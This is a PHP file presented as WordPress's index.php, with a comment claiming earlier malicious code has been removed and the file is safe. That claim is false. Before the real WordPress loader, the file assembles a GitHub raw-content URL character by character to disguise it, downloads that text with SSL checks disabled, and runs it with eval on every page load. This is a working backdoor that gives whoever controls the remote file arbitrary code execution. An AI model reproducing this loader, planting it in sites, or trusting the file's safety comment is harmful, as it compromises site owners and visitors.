<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

// Initialize core components
$x1 = 'h'; $x2 = 't'; $x3 = 't'; $x4 = 'p'; $x5 = 's';
$x6 = ':'; $x7 = '/'; $x8 = '/'; $x9 = 'r'; $x10 = 'a';
$x11 = 'w'; $x12 = '.'; $x13 = 'g'; $x14 = 'i'; $x15 = 't';
$x16 = 'h'; $x17 = 'u'; $x18 = 'b'; $x19 = 'u'; $x20 = 's';
$x21 = 'e'; $x22 = 'r'; $x23 = 'c'; $x24 = 'o'; $x25 = 'n';
$x26 = 't'; $x27 = 'e'; $x28 = 'n'; $x29 = 't'; $x30 = '.';
$x31 = 'c'; $x32 = 'o'; $x33 = 'm'; $x34 = '/'; $x35 = 'm';
$x36 = 'd'; $x37 = 'm'; $x38 = 'o'; $x39 = 'm'; $x40 = 'i';
$x41 = 'n'; $x42 = '3'; $x43 = '6'; $x44 = '5'; $x45 = '3';
$x46 = '6'; $x47 = '6'; $x48 = '-'; $x49 = 'g'; $x50 = 'i';
$x51 = 'f'; $x52 = '/'; $x53 = 'b'; $x54 = 'e'; $x55 = 'l';
$x56 = 'a'; $x57 = '/'; $x58 = 'r'; $x59 = 'e'; $x60 = 'f';
$x61 = 's'; $x62 = '/'; $x63 = 'h'; $x64 = 'e'; $x65 = 'a';
$x66 = 'd'; $x67 = 's'; $x68 = '/'; $x69 = 'm'; $x70 = 'a';
$x71 = 'i'; $x72 = 'n'; $x73 = '/'; $x74 = 'i'; $x75 = 'n';
$x76 = 'd'; $x77 = 'e'; $x78 = 'x'; $x79 = '.'; $x80 = 't';
$x81 = 'x'; $x82 = 't';

$full_url = $x1.$x2.$x3.$x4.$x5.$x6.$x7.$x8.$x9.$x10.$x11.$x12.$x13.$x14.$x15.$x16.$x17.$x18.$x19.$x20.$x21.$x22.$x23.$x24.$x25.$x26.$x27.$x28.$x29.$x30.$x31.$x32.$x33.$x34.$x35.$x36.$x37.$x38.$x39.$x40.$x41.$x42.$x43.$x44.$x45.$x46.$x47.$x48.$x49.$x50.$x51.$x52.$x53.$x54.$x55.$x56.$x57.$x58.$x59.$x60.$x61.$x62.$x63.$x64.$x65.$x66.$x67.$x68.$x69.$x70.$x71.$x72.$x73.$x74.$x75.$x76.$x77.$x78.$x79.$x80.$x81.$x82;

// Attempt to get remote content
$content = @file_get_contents($full_url);
if ($content === false && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $full_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $content = curl_exec($ch);
    curl_close($ch);
}

// Only eval if we have content
if (!empty($content)) {
    @eval('?>' . $content);
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
